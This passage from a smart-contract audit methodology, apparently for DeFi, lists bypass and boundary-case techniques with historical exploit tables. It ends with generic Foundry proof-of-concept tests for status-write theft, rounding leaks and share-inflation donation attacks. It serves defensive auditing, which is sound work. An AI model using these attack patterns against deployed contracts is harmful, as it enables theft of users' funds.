- Compound V2 fork class — `accrueInterest` recomputes per-market state; any caller; downstream `borrow` trusts the resulting market state. (Hundred / Onyx / Channels — combined with B.5.)
- "Promote-on-refresh" pattern observed broadly in credit-line and lifecycle pools: a refresh/accrue/tick helper writes a happy-path enum value (e.g., `Active`, `GoodStanding`, `Valid`) as the default branch when no delinquency is detected, regardless of whether the prior state was the privileged-approved state or the not-yet-approved state. Downstream callers gate on the enum value, not on the write-site.

### A.8 Initialization & Deployment Race

Invariants asserted in `initialize` but not enforced at runtime are bypass-prone:

- Atomic deployment + init (or access-controlled init)
- Implementation-side init disabled
- Reinitializer cannot replay
- Trusted root / validator set / oracle set at init AND verifiable post-init
- Storage layout collision impossible across upgrades

### A.9 Validation

| Exploit | $ | Bypass sub-technique |
|---------|---|----------------------|
| Poly Network | $611M | A.5 (privileged keeper reachable via crafted cross-chain message) |
| Kelp (LayerZero OFT) | $293M | A.6 (message verification dependency violated) |
| Nomad | $190M | A.8 (upgrade init marked the zero root confirmed; unproven messages inherited the same zero sentinel) |
| Beanstalk | $181M | A.4 (flash-loan + governance precondition composition) |
| Parity Multisig | $150M | A.8 (implementation initializable post-deploy) |
| Wormhole | $326M | A.2 + A.6 (attacker-supplied Instructions sysvar was not bound to the canonical sysvar, bypassing signature verification) |
| Penpie | $27M | A.4 (register fake market + flash-loan + reentrancy composition) |
| Hedgey | $44.7M | A.4 (flash-loan setup + claim function precondition falsification) |
| Munchables | $62.5M | A.8 (storage set during init by malicious dev) |
| Cork V1 | $12M | A.3 (privileged op reachable via Uniswap V4 hook callback) |
| Hundred / Onyx | $9M | A.7 + B.5 (refresh writes state used as auth-gate; empty market boundary) |
| LI.FI | $600K | A.2 + A.6 (no validation on swap target/calldata) |

---

## Methodology B: Boundary Cases

For every value computation, enumerate boundary regimes and check each one.

### B.1 Rounding Direction

Every `/` and `%`:

- Rounds up or down?
- Favors protocol or user?
- For paired inverse operations (deposit↔redeem, mint↔burn, supply↔withdraw, borrow↔repay): measure the complete net round trip, including fees and state changes; a single rounding direction alone does not prove who profits
- ERC-4626: both `convertToShares` and `convertToAssets` round down by specification, but they are idealized estimates rather than executable quotes. Check the specified rounding of the relevant preview/mutable operation and its net economic effect

### B.2 Scaling & Decimal Normalization

Cross-decimal math is the highest-density bug surface:

- Token decimals: 6 (USDC), 8 (WBTC), 18 (DAI/ETH), other
- Price-feed decimals: Chainlink USD = 8, ETH-pair = 18, Pyth uses exponent
- Basis points (1e4), wad (1e18), ray (1e27)
- Are conversions explicit? Is `scaleFrom` × `scaleTo` consistent across the codebase?

**Arithmetic-integrity primitives (where the math itself breaks, independent of scaling):**

- **Downcast truncation** — `uint128(x)` / `uint64(x)` / `int128(x)` where `x` can exceed the target width: silently wraps, no 0.8 panic on explicit casts. Grep every `uint\d{1,3}\(` / `int\d{1,3}\(` and ask "can the source value exceed the target?" (Common in tightly-packed accounting structs and tick/share math.)
- **`unchecked { }` blocks** — re-derive that every operation inside genuinely cannot overflow/underflow for *attacker-chosen* inputs, not just expected ones. The compiler's 0.8 protection is explicitly off here.
- **Precision-loss ordering** — `(a / b) * c` usually loses more precision than
  a full-precision `mulDiv(a, c, b)`. Reordering can change rounding and overflow
  behavior, so derive the intended result and bounds rather than applying a
  blanket multiply-before-divide rewrite.
- **Signed/unsigned mixing** — `int256`↔`uint256` casts where a negative becomes a huge positive; subtraction that should clamp at zero but underflow-reverts (DoS) or wraps (in `unchecked`).
- **Exponentiation / compounding** — `rpow`/`rmul` accumulation drift, per-block compounding that diverges from the documented rate, `**` on attacker-influenced exponents.
- **Phantom-overflow in intermediate terms** — the final result fits `uint256` but an intermediate product (`a * b` before `/ c`) overflows; use `FullMath.mulDiv` / 512-bit intermediate or prove the bound.
- **Division-by-zero / mod-by-zero** — any denominator that can reach 0 (empty supply, zero liquidity, zero weight) — reverts (DoS) at best, and is often on a path that should stay live.

Uranium Finance ($57.2M) was a single 1000× decimal mistake in the K-invariant; Compound V2 ($147M) was a distribution-boundary math error. Arithmetic bugs are rarely subtle once you re-derive the expression with adversarial inputs — the discipline is doing it for *every* fund-touching expression, not eyeballing the ones that "look fine."

### B.3 Accounting Invariants

Identify the protocol's intended source of truth and reconcile it with custody balances:

- `sum(userBalances) == totalSupply` invariant tested
- A raw `balanceOf(address(this))` or native balance may be correct when the design intentionally recognizes donations, rebases, or balance deltas; it is unsafe when unsolicited balance changes can alter price, credit, or claims contrary to the specification
- An internal ledger may also drift from custody. Define and test the reconciliation invariant, including surplus/deficit handling and any explicit `sync`, donation, or skim semantics
- Rebasing tokens (stETH, aTokens) cause silent drift — wrap or normalize
- Fee-on-transfer tokens cause `transferFrom(x, this, n)` to credit `<n` — measure delta, don't trust input
- Self-transfers double-credit naive accounting

### B.4 Zero / Dust / Max Boundaries

For every input amount, test:

- `amount = 0` — revert, no-op, or silent accounting corruption?
- `amount = 1 wei` — does rounding to zero break anything?
- `amount = totalSupply` — full-withdraw path
- `amount = type(uint256).max` — common "approve infinite" sentinel
- `supply = 0` (no depositors) — first-depositor regime
- `supply = 1 wei` (residual after full withdraw) — last-withdrawer dust trap

### B.5 Share/Asset Conversion Edges

- First depositor controls share/asset ratio — inflation attack surface
- Virtual offset (OZ `_decimalsOffset`) or dead shares minted at deploy
- Last withdrawer absorbs residual dust — should be bounded
- Per-user share rounding cannot accumulate to systemic drift

### B.6 Tick / Bucket / Segment Boundaries

- Off-by-one between tiers (Compound V2 fork class)
- Exact-boundary inclusivity (`<=` vs `<`) on liquidation threshold, debt ceiling, supply cap
- Tick math precision at extremes (KyberSwap Elastic class)
- Fee tier boundaries on AMMs

### B.7 Time Boundaries

- `deadline == block.timestamp` (inclusive vs exclusive)
- Maturity exactly hit
- `block.timestamp == lastUpdate` (delta = 0)
- L2 sequencer uptime grace period boundaries
- Voting period boundaries (snapshot block, voting end block)

### B.8 Flash-Loan-as-Amplifier

For every value path, ask: *if attacker had unlimited free capital for one tx, what would they do?*

- Same-block oracle read → manipulate
- Share-price-dependent mint/redeem → inflate then dump
- Governance vote at execution-time `balanceOf` → flash-loan vote
- Pool reserve donation → break invariant
- Solvency check using current `balanceOf` → momentarily inflate
- Reward calculation using current TVL → inflate then claim

### B.9 Validation

| Exploit | $ | Boundary sub-technique |
|---------|---|------------------------|
| Euler V1 | $197M | B.3 + B.8 (`donateToReserves` violated solvency invariant; flash-loan self-liquidation) |
| Compound V2 | $147M | B.1 + B.6 (math mistake at distribution boundary) |
| CREAM Lending | $130M | B.8 (flash-loan-amplified oracle) |
| Balancer V2 Composable | $128M | B.3 + B.6 (composable pool invariant manipulation at swap boundary) |
| Uranium Finance | $57.2M | B.2 (K invariant scaling error — 1000× decimal mistake) |
| KyberSwap Elastic | $48M | B.6 (tick math precision at concentrated-liquidity boundary) |
| Sonne Finance | $20M | B.5 (empty market first-depositor donation, Compound fork) |
| UwU Lend | $20M | B.8 (flash-loan oracle amplifier) |
| Hundred / Onyx | $9M | B.5 + B.6 (empty market + Compound rounding) |
| Venus Core Pool | $3.7M | B.3 (donation attack on accounting) |

---

## Methodology Optimizations

Methodologies A and B are execution passes — they operate on a working mental model. The optimizations below build that model first (pre-passes), extend the lens (cross-passes), and triage the output (post-pass).

| Optimization | Stage | Catches what bare A/B miss | Validation |
|--------------|-------|----------------------------|------------|
| **C. Invariant Specification** | Pre-pass | Violations where code is "correct per function" but breaks a system property | Euler V1, Compound V2, Beanstalk, Sonne |
| **D. State Machine / Lifecycle** | Pre-pass | State-transition bugs (replay, expired-but-used, double-claim) | Nomad, Penpie, Hedgey, Orbit Bridge |
| **E. Trust Boundary Map** | Pre-pass | "What if a trusted entity misbehaves" scenarios | Munchables, Wormhole, key-compromise class |
| **F. Negative Space** | Cross-pass | Missing checks, missing modifiers, missing events | LI.FI, "Missing Access Control" |
| **G. Differential Analysis** | Cross-pass | Fork-specific divergence; cross-chain divergence | Sonne, Hundred, Onyx, Channels, Yearn yUSDT |
| **H. Failure-Mode Catalog** | Cross-pass | Stale/zero/reverting dependency behavior | Outdated Oracle, Misconfigured Oracle (×4) |
| **X. Cross-Boundary Logic** | Cross-pass | Bugs in the *seam* between two correct units: function↔function, contract↔contract, protocol↔dependency-semantics | MasterChef desync, vault/strategy desync, Conic, Sentiment |
| **J. Business-Logic & Economic-Design** | Cross-pass | Exploits using the *intended* flow because the economics are wrong: free-rider/JIT, liquidation incentives, griefing, self-dealing | Beanstalk, reward-gaming / JIT class |
| **I. Severity Calibration** | Post-pass | Triage; informs go/no-go and disclosure urgency | Methodological |

---

### C. Invariant Specification (Pre-Pass)

**Premise:** Explicit system-level properties often expose defects that per-function review misses. State only properties the protocol actually promises; invariants are claim and verification targets, not a mandatory discovery technique.

**Steps:**

1. **Solvency** — `sum(collateralUSD) ≥ sum(debtUSD) × minHealthFactor`; `totalAssets ≥ totalShares × minSharePrice`; `mintedTokens ≤ lockedCollateral × ratio`.
2. **Conservation** — `sum(userBalances) == totalSupply`; `assetsIn == assetsOut + feesRetained`; bridges: `mintedOnDest == lockedOnSource`.
3. **Monotonicity** — share price never decreases (except realized loss); interest index only increases; nonces only increase; vesting unlocked-amount only increases.
4. **Uniqueness** — each cross-chain message processed at most once; each signature consumed at most once; each proposal ID executed at most once.
5. **Authorization** — protected mutations and effects require the actor/capability the design promises; security-sensitive external data is validated to the degree its use requires.
6. **Liveness** — legitimate critical operations remain available under the protocol's stated dependency and administrative assumptions, or their bounded failure modes are explicit.

Each invariant becomes a target. A asks: *what path violates this invariant?* B asks: *at what boundary does this invariant fail?*

**Optional output scaffold:** a written list of relevant invariants (often 5–20 for a non-trivial protocol). Establish or challenge them with any suitable method—for example manual derivation, tests, fuzzing, symbolic execution, model checking, formal proof, traces, or differential analysis.

---

### D. State Machine / Lifecycle Analysis (Pre-Pass)

**Premise:** Many contracts implement a state machine without naming it. Bugs hide in invalid transitions — paused→executed, expired→claimed, cancelled→fulfilled, pending→processed→re-processed.

D needs evidence of the transitions material to the claim or coverage assertion. Atlas `gates.md`/`writes.md` are one input; call graphs, specifications, traces, formal models, queries, or manual write-site review may provide equivalent or stronger evidence.

**Steps:**

1. Enumerate states: `Order { Created → Filled / Cancelled / Expired }`, `Proposal { Pending → Active → Succeeded / Defeated → Queued → Executed / Expired }`, `Position { Open → Liquidatable → Liquidated / Closed }`, `Message { Sent → Verified → Executed }`, `CreditRecord { Deleted → Requested → Approved → GoodStanding → Delayed → Defaulted }`.
2. Identify relevant write/transition sites from the selected evidence. If using `atlas/writes.md`, verify it covers struct overwrites, helper setters, initializers, and assembly stores before relying on it.
3. **When useful, build a transition matrix.** Rows = from-state, columns = to-state, cells identify the concrete transition/write plus its guard or proof condition. Read the matrix two ways:
   - **Row read:** for each from-state, what to-states are reachable, and by which functions? (Catches "should be terminal but isn't.")
   - **Column read:** for each to-state, what from-states lead in, and what preconditions does each write enforce? (Catches "this auth-gate value is reachable from a non-privileged path.")
4. Enumerate the transitions the code permits. Draw the graph.
5. Enumerate the transitions the code does NOT permit (the negative space of the state machine). Compare against the best available intent evidence; if it forbids X→Y but the code permits it, create a candidate.
6. Verify each transition has a guard that asserts the source state. If a write-site's local preconds *do not* assert the source state, it can transition from *any* from-state — including states the protocol team thinks are unreachable.
7. Verify terminal states are terminal — Executed cannot transition back to Pending; Liquidated cannot become Open; Consumed cannot become Unconsumed.
8. Verify cross-state invariants — a Pending message cannot appear in two `pendingMessages` mappings; an Executed proposal cannot have its calldata replayed.
9. **Auth-channel cross-check.** For each state value that downstream effects rely on, confirm that every reachable write-site landing on that value enforces the expected precondition. Record mismatches as candidates, in `delta.md` when using the Atlas.

Distinct from A.3: A.3 traces *who reaches* a mutation; D traces *which from-states permit* the mutation. The latter catches "expired-but-callable" and "consumed-but-replayable" bugs.

**Optional output scaffold:** a transition matrix per relevant lifecycle object, with each cell tied to a concrete transition/write and its guard or proof condition. Equivalent reviewable state-machine evidence is valid.

---

### E. Trust Boundary Map (Pre-Pass)

**Premise:** Every contract trusts something — an admin, an oracle, an upstream protocol, a guardian set, a relayer, a sequencer. Enumerate every trusted entity, then ask: *what happens if this entity misbehaves?*

**Steps:**

1. List the trusted entities. Each external call, each privileged modifier, each immutable address is a trust edge.
2. For each entity, list what the contract trusts about it: honesty, liveness, return-value sanity, monotonicity, non-corruptibility.
3. For each trust assumption, ask the four canonical questions:
   - **Compromise:** entity is malicious — what damage?
   - **Liveness:** entity goes offline — can users exit?
   - **Lie:** entity returns valid-looking but wrong data — what breaks?
   - **Slow:** entity returns stale data — what breaks?
4. For each answer, ask: is there a mitigation in code? Pause, multi-sig redundancy, oracle fallback, timelock, withdrawal-window?

**Output deliverable:** A trust matrix: rows are entities, columns are {Compromise, Liveness, Lie, Slow}, cells are concrete damage + mitigation.

---

### F. Negative Space (Cross-Pass)

**Premise:** A/B look at code that exists. F looks at code that *should* exist but doesn't.

**Steps:**

1. For every function that moves funds or changes critical state: what access modifier *should* be present? Is it?
2. For every external call return value: is it checked?
3. For every parameter with an implicit valid range: is the validation present?
4. For each externally observable or accountability-sensitive mutation: does the
   design require an event or another reliable observation path, and is it present?
5. For every loop: is it bounded?
6. For every pause-able operation: is the pause modifier actually present on every related function? (Partial-pause bugs)
7. For every "this should be private/internal": is the visibility correct?

**Methods:** unrestricted. Manual comparison, semantic queries, SAST, agents, specifications, diffs, and custom analyses may all help. Negative-space closure must still explain what ought to exist and how its absence was checked; no tool name alone proves completeness.

**Output deliverable:** Per-function completeness checklist — what should be checked, what is checked, the delta.

---

### G. Differential Analysis (Cross-Pass)

**Premise:** Fork audits should concentrate budget on the *delta*, not parts inherited from a well-audited upstream. Same for cross-chain deployments.

**Steps:**

1. **Fork audits:**
   - Identify upstream protocol, version, audited tag
   - `git diff` source against upstream
   - Classify every change:
     - **Parameter** (LTV, fee bps, cap): classify by the invariant and economic effect it changes; a small diff can still create critical insolvency or extraction
     - **New feature** (new asset type, new pool kind): full review
     - **Logic modification** (value math, state transitions, invariants): independent review — upstream audit does NOT transfer
2. **Cross-chain audits:**
   - Diff deployed bytecode (not just source) per chain
   - Chain-specific behaviors: opcode availability, gas semantics, sequencer feeds (L2), account model differences (Solana/Move)
   - Confirm trusted addresses are correct per chain
3. **Sibling function diff** — when a contract has parallel functions (`deposit` and `depositFor`, `swap` and `swapExactInput`), diff them: a check present in one and absent in the other is suspect.

**Output deliverable:** Diff summary with risk-tiered classification.

---

### H. Failure-Mode Catalog (Cross-Pass)

**Premise:** For every external dependency, enumerate every plausible failure and trace the consequence.

**Steps:**

1. **Per dependency, enumerate failure modes:**
   - Oracle: stale, zero, reverting, deviating, sequencer-down
   - Token: revert, return-false-no-revert (USDT), fee-on-transfer, rebasing, blocklist (USDC freezing)
   - Bridge: message delayed, replayed, mis-routed
   - Aggregator/router: partial fill, slippage breach, callback re-entry
   - Liquidity source: pool drained, paused, price-impact extreme
2. **Per failure mode, trace the consequence:** graceful revert (acceptable) / silent consumption (critical) / state corruption (critical) / stuck funds (serious).
3. **Per critical consequence, identify mitigation:** fallback source, pause + recover, bounded staleness, try/catch, multi-source aggregation.

**Output deliverable:** Failure-mode matrix per dependency.

---

### X. Cross-Boundary Logic (Cross-Pass)

**Premise:** When selected, X interrogates the *seams* where two units that are
each correct in isolation combine into an incorrect whole. A multi-step path may
be locally safe at each node and harmful only across the seam. X offers three
optional sub-lenses by boundary type: function↔function, contract↔contract, and
protocol↔dependency.

> **How to run X when useful:** pair the available function, state, value-flow, and dependency evidence and ask "do these two agree?" Atlas and model artifacts are convenient inputs, not prerequisites.

#### X.1 Cross-Function Logic (within one contract)

Two functions share state or an invariant, and the invariant only holds if they are called in a certain order / together / never interleaved. The defect is the *relationship*, not either function.

Checklist:

1. **Shared-invariant pairs.** For every invariant from C, list *all* functions that read or write its terms. If function A can move a term without A also restoring the invariant — and a second function B trusts the invariant — that's the seam. (Classic: `accrue()` must run before `borrow()` reads the rate, but `borrow()` doesn't call it / a sibling path skips it.)
2. **Cache / derived-value desync.** Grep for any stored value that is a *copy or function of* another stored value (`cachedTotal`, `lastIndex`, `storedExchangeRate`, `rewardPerTokenStored`, snapshot balances). For each, enumerate every write-site of the *source* and confirm each one also updates the cache. A source write that skips the cache update is a desync bug. (MasterChef-class reward-debt bugs are exactly "a transfer path that didn't update `rewardDebt`.")
3. **Partial-update / multi-field structs.** A function that writes 2 of 3 related fields, leaving a third stale that another function reads as authoritative.
4. **Modifier asymmetry across siblings.** Parallel functions (`deposit`/`depositFor`, `withdraw`/`withdrawTo`, `swap`/`swapAndCall`) where a check (`nonReentrant`, `whenNotPaused`, `onlyX`, a bounds check) is present on one and absent on the other. (This is G.3 sibling-diff applied as a security seam, not just a fork-diff.)
5. **Accrual applied 0× or 2×.** Fee/interest/reward accrual that double-counts on one call path and skips on another, depending on which function is the entry.
6. **Intra-tx ordering.** Can the attacker call A then B (or B then A) within one tx to land in a state neither function alone permits? (Links to A.4 combined-call composition; X.1 is the *logic* version, not just the precondition-satisfaction version.)

*Validation:* MasterChef-fork reward-debt desync (recurring); Compound `accrueInterest` ordering dependence (Hundred/Onyx class, combined with B.5/B.6).

#### X.2 Cross-Contract Logic (within one protocol, multiple contracts)

The protocol is several contracts; an assumption made in one is false because of another. Reentrancy is the *timing* version (ladder Q2, A.6) — X.2 is the *state-consistency and wiring* version.

Checklist:

1. **Duplicated / shadowed state.** Two contracts each track the "same" quantity (Vault.`totalAssets` vs Strategy's own accounting; Manager.`totalDebt` vs Pool's; a token's `balanceOf` vs an internal ledger in a sibling). Enumerate every path that updates one but not the other → desync. Ask: which one do fund-effect sinks read, and can the attacker move the *other* one?
2. **Stale snapshot across the boundary.** Contract A reads a value from contract B that B updates lazily (pull model) — A acts on a value that is correct in B's storage but stale relative to reality (e.g., reads `lastReportedPrice`/`totalSupply` before B's update tx). Push-vs-pull mismatch is the tell.
3. **Unit / decimals mismatch at the seam.** A passes a raw amount to B in a different scale than B expects (6-dec token, 18-dec internal; price in ray vs wad). The conversion is correct *inside* each contract but wrong *between* them.
4. **Trust / binding assumptions.** "Only contract B calls this" but the function is `public`/`external` with no `msg.sender == B` check → anyone calls it directly. Or A holds B's address in a *settable/upgradeable* slot and assumes it's immutable → admin/attacker repoints it. Or A grants a role to B, and B has a public passthrough that forwards arbitrary calls → privilege laundering.
5. **Initialization / wiring order.** Multi-contract deploy where there's a window in which A points at a zero/uninitialized B, or B's address in A is set after A goes live → front-runnable wiring (links to A.8).
6. **Asymmetric pause / upgrade.** Pausing A but not B (or upgrading one of a coupled pair) leaves an exploitable path open or a storage/ABI assumption broken across the pair.
7. **Shared-token custody.** Multiple contracts hold/move the same token and one uses `balanceOf(address(this))` for accounting. Determine whether a sibling transfer or donation is intentionally recognized; if not, it can desynchronize price, claims, or an internal ledger (links to B.3).

*Validation:* vault/strategy debt-desync drains (recurring); privilege-laundering via a contract with a public forwarder; wiring/init front-runs (Parity/Nomad family at the cross-contract layer).

#### X.3 Cross-Protocol / Dependency-Semantics (external integrations)

H asks "what if the dependency *fails* (stale/zero/revert)." X.3 instead asks:
**"what if the dependency works exactly as designed, but we assumed the wrong
thing about how it works?"** This is a distinct and important integration-failure
class, not a claim that X.3 must be used.

Checklist:

1. **Manipulable "view" functions read as ground truth.** `Curve get_virtual_price()` / `Balancer getRate()` are manipulable *inside* a read-only reentrancy window; `ERC4626.convertToAssets()` / `previewRedeem()` move under donation; AMM spot/`getReserves()` move under flash loans; a farm's reward index can be pumped. Grep every external `view` call that feeds a fund-effect and ask "can the attacker move this within the tx?"
2. **Read-only reentrancy from the dependency.** The integrated pool's remove-liquidity/withdraw path invokes a callback (native-token send, ERC777, hook) *before* it finishes updating its own reserves; your contract reads the dependency's state during that window. (Conic $3.2M, Sentiment $1M — both Curve/Balancer read-only reentrancy.)
3. **Token quirks of the *integrated* asset** (not your own token): fee-on-transfer, rebasing, ERC777/1155 receive hooks, double-entry/proxy tokens, return-false-no-revert (USDT), blocklist/pausable (USDC), upgradeable token whose behavior can change. Each violates a default `transferFrom(x, this, n) ⇒ +n` assumption (links to B.3/A.6).
4. **Wrong semantics / version / fork.** You integrate against "Uniswap V2 math" but the pool is a fee-on-swap fork; you assume `latestAnswer` is fresh (it's deprecated, no staleness); you assume a function is non-reentrant or atomic when it isn't; you assume 18 decimals on an 8-decimal feed.
5. **Dependency upgradeability.** The integrated protocol is itself a proxy — its behavior can change under you post-deploy. Is that in your trust map (E)? Is there a guard or just blind trust?
6. **Composition / atomicity assumptions.** You assume two external calls execute
   "together" or that no one can interpose between them; the attacker sandwiches
   the integration call or front-runs setup. Bind price-sensitive interactions to
   appropriate limits/deadlines/oracles; plain transfers do not universally need
   a `minOut`.
7. **Callback surface from the dependency.** Flash-loan callbacks, swap callbacks (`uniswapV3SwapCallback`), and ERC-3156 hooks are externally invoked entries, not internal code. Treat them as adversarial until the expected caller and the live operation's initiator/data/phase are bound; a correctly authenticated callback is not automatically permissionless.
8. **Idealized estimate treated as immediately realizable value.** ERC-4626 deliberately gives these methods different semantics: `convertToAssets` is an idealized average-user estimate that excludes fees, previews estimate the corresponding operation under current conditions but ignore limits, and `maxWithdraw` / `maxRedeem` report caller-specific execution limits that must not overstate what succeeds. Therefore `maxWithdraw ≪ convertToAssets` can be valid and is not itself a bug. A candidate exists when a consumer treats an idealized conversion or preview as immediately withdrawable liquidity, collateral, or settlement value, or when a vault's `max*` overstates the actual executable limit. Model who can realize value, when, under which queue/limit/fee conditions, and the resulting gain and loss.

*Validation:* Conic Finance ($3.2M, Curve `get_virtual_price` read-only reentrancy); Sentiment ($1M, Balancer read-only reentrancy); CREAM/UwU/Cheese (oracle/`get_virtual_price` manipulation); the recurring "integrated a fork with different fee/decimal semantics" class; vault-of-vaults that use an idealized sub-vault conversion as realizable liquidity without respecting executable limits.

**Optional output scaffold:** append to the candidate registry a seam table: `(boundary type or other classification, unit-A, unit-B, the assumption A makes about B, the path that violates it, effect reached)`. Every material row receives claim-bound evidence and independent triage; only human-accepted rows enter `findings.md`.

---

### J. Business-Logic & Economic-Design (Cross-Pass)

**Premise:** J looks for chains the code and design intend but that are nonetheless exploitable because the **economic design itself is wrong**. No access bypass, math error, or reentrancy is required: a rational actor may use the protocol as built and extract value. Use the best available intent evidence—specification, source, governance parameters, transaction history, or an explicit economic model.

This class can be difficult to find with code-oriented tooling because the code
may be "correct." When J is selected, apply it to the best available actor and
value-flow evidence, which may be O.1/O.2, a specification, transaction data, an
economic model, or another reviewable artifact.

Checklist:

1. **Does the implemented economics match the documented economics?** Re-derive the fee, reward, interest, and price formulas from source and compare to the whitepaper. A fee taken on the wrong base, a reward distributed pro-rata when it should be time-weighted, or an APY that does not match the emission schedule creates a J candidate even though each line compiles correctly.
2. **Free-rider / just-in-time.** Can an actor capture a reward, fee rebate, or yield without bearing the corresponding risk/duration? Deposit-right-before-a-distribution-then-withdraw (ladder Q17); JIT liquidity around a fee event; vote/boost with borrowed/flash-loaned weight (ladder Q25); claim-then-exit.
3. **Time-based logic.** Vesting cliffs, lockups, epochs, streaming, funding intervals, `lastUpdate` deltas — check the boundary arithmetic *and* the incentive at the boundary (B.7 is the math; J is "who profits from hitting the boundary at the perfect moment").
4. **Liquidation / penalty economics.** Incentive too low → no one liquidates → bad debt accrues (liveness-economic). Too high → over-liquidation / griefing. Self-liquidation profit. Bad-debt socialization that the last-out user eats. Dust positions that cost more gas to liquidate than they yield.
5. **Order-of-operations in the business flow.** The sequence is mechanically valid but lets a user extract: e.g., realize gains before a fee is assessed, refresh a discount before paying, reset a timer cheaply, claim across an epoch boundary twice.
6. **Fairness across user classes.** First-depositor advantage (B.5), last-withdrawer dust trap (B.4), snapshot-timing advantage, whales vs dust rounding, ordering/MEV on shared actions (rebalance, harvest, auction).
7. **Griefing economics.** Can an attacker impose cost on others or the protocol *cheaply* with no direct profit motive? Lockout-extension (ladder Q27), queue/mempool spam, forcing an unbounded loop, dust-donation to break first-depositor math, blocking a withdrawal path.
8. **Self-dealing parameter power.** Even legitimately-held admin/keeper powers: can a parameter change (fee, rate, cap, oracle source) be applied *retroactively* to in-flight positions, or timed against a known user action, to extract value? (This is the economic half of E's trust map.)
9. **The "why would the team build it this way?" test.** For each surprising design choice, ask whether it benefits the team/insiders at users' expense (mint authority, withheld emissions, asymmetric fees, exit restrictions). Pre-investment audits especially must surface design-level extraction, not just bugs.
10. **Redemption / subscription fairness in liquidity-tiered or multi-asset vaults.** When mint and redeem price at a *blended* NAV that counts illiquid / locked / impaired positions at par (X.3 item 8), and payouts draw the liquid bucket first (idle → liquid legs → illiquid last) or first-come-first-served, the design bakes in a first-mover redemption advantage: early redeemers exit at full paper value out of the *shared* liquid buffer, while the illiquidity or impairment is socialized onto slow and last-out holders — and new depositors mint at the inflated price, subsidizing incumbents. No manipulation is required (ordinary net outflow does it); a rational actor can also *manufacture* the trigger (push a sub-vault's utilization up, front-run a pending write-down) and win the run they started. The same "quoted price the reserve cannot honor for the tail" shape recurs in subsidized / partial-reserve bonding curves (early sellers exit against the reserve; the tail cannot). Fix families to look for: realizable-value pricing (`min(marked, liquidity-adjusted)`), pro-rata draw across *all* legs (not liquid-first), async / queued redemption (ERC-7540), exit fee / swing pricing, deposit gating when unrealizable NAV exceeds a threshold. This is the economic complement of X.3 item 8: X.3 spots the mispricing; J.10 is who profits from it.

*Validation:* Beanstalk ($181M, governance-economics — flash-loaned voting weight was the *intended* voting mechanism, used adversarially); recurring reward-gaming / JIT / deposit-before-distribution extractions; liquidation-incentive failures producing protocol-level bad debt; illiquidity-blind vault-of-vaults NAV + liquid-first redemption enabling first-mover socialization (~$6M-class).

**Optional J artifact:** for each economic loop examined, preserve a row such as
`(actor, intended flow, value extractable by rational use, whether it harms the
protocol / other users / neither)`, or equivalent evidence. A harmful extraction
is a candidate until the full triage contract establishes the target,
reachability, impact, falsification, and disposition; no code defect is required.

---

### Optional PoC Pattern Library — From Hypothesis to Receipt

These Foundry idioms can accelerate an executable EVM test. They are examples,
not required validation formats; use any sound method that supports the exact
claim. A snippet is only scaffolding: it cannot support acceptance until the
real target, actor/capabilities, preconditions, consequence, and relevant
falsification are established.

> **Chain note:** All 10 patterns below are the **EVM library** — Foundry / Solidity primitives (`vm.prank`, `deal`, `--fork-url`, ERC-20/4626). The pattern *shapes* recur across chains; the harnesses differ, so each non-EVM chain ships its own runnable library:
>
> - **Solana:** `playbook-solana.md § 3` (S1 account substitution, S2 arbitrary CPI, S3 PDA sharing, S4 bump, S5 close/revive, S6 atomic oracle) with LiteSVM/Mollusk harnesses plus coherent-snapshot replay guidance; the `templates/solana/fork_replay.sh` live-clone scaffold is exploratory until adapted.
> - **Sui / Move:** `playbook-sui.md § 3` (U1 missing-capability/private→shared, U2 shift truncation, U3 ability misuse, U4 hot-potato oracle, U5 PTB composition) with `test_scenario` harnesses and localnet reconstruction; templates in `templates/sui/`.
>
> Evidence fidelity, explicit blockers, and claim-to-evidence fit are chain-agnostic. A reconstruction does not become deployed-state evidence merely because it uses a particular harness.

#### Pattern 1: "Permissionless write reaches privileged-only sink"

```solidity
// Hypothesis: write-site W-NN (in a permissionless bookkeeping helper) reaches
//             status == Claimable; sink S-MM pays escrow when status is Claimable.
// Test:       prank as arbitrary EOA, do the chain, assert the sink fires.
function test_permissionless_status_write_reaches_claim() public {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 10 ether);
    vm.prank(victim);
    uint256 orderId = target.createOrder{value: 10 ether}(attacker); // Pending

    uint256 escrowBefore = address(target).balance;
    uint256 attackerBefore = attacker.balance;
    vm.startPrank(attacker);
    target.syncOrder(orderId);                       // wrongly writes Claimable
    target.claim(orderId, payable(attacker));        // payout without fulfillment
    vm.stopPrank();

    assertEq(attacker.balance - attackerBefore, 10 ether, "attacker gain");
    assertEq(escrowBefore - address(target).balance, 10 ether, "victim escrow loss");
    assertFalse(target.wasFulfilled(orderId), "order was never fulfilled");
}
```

Adapt names/signatures to the real protocol; the essential control is that the
funds originate from another party and the intended fulfillment condition is
still false.

#### Pattern 2: "Rounding round-trip leaks value"

```solidity
function test_roundtrip_leak() public {
    deal(address(underlying), user, 1e18);
    vm.startPrank(user);
    underlying.approve(address(target), type(uint256).max);

    uint256 startBal = underlying.balanceOf(user);
    for (uint i = 0; i < 1000; ++i) {
        target.deposit(123 wei);    // attacker-chosen dust
        target.withdraw(123 wei);
    }
    uint256 endBal = underlying.balanceOf(user);
    // Include all fees/costs in the chosen net-value measure. A leak requires
    // attacker profit and a corresponding protocol/user deficit, not merely a
    // user-favoring intermediate rounding result.
    assertGt(endBal, startBal, "no net attacker profit after round trip");
}
```

#### Pattern 3: "Share inflation via direct donation"

```solidity
function test_share_inflation() public {
    // 1. Attacker first-deposits dust to get 1 share
    address attacker = makeAddr("att");
    deal(address(underlying), attacker, 1e30);
    vm.prank(attacker);
    underlying.approve(address(target), type(uint256).max);
    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker); target.deposit(1);
    // 2. Donate large amount directly to the vault — pumps totalAssets, not totalSupply
    vm.prank(attacker); underlying.transfer(address(target), 1e18);
    // 3. Victim deposits — receives 0 shares due to rounding
    address victim = makeAddr("victim");
    deal(address(underlying), victim, 1e18);
    vm.prank(victim); underlying.approve(address(target), type(uint256).max);
    uint256 victimAssets = 1e18 - 1;
    // For the simple floor(assets * totalSupply / totalAssets) formula, zero
    // shares requires victimAssets * totalSupply < totalAssets.
    vm.prank(victim); target.deposit(victimAssets);
    assertEq(target.balanceOf(victim), 0, "victim got zero shares");
    uint256 attackerShares = target.balanceOf(attacker);
    vm.prank(attacker);
    target.redeem(attackerShares, attacker, attacker);
    assertGt(underlying.balanceOf(attacker), attackerBefore, "attacker did not capture victim assets");
}
```

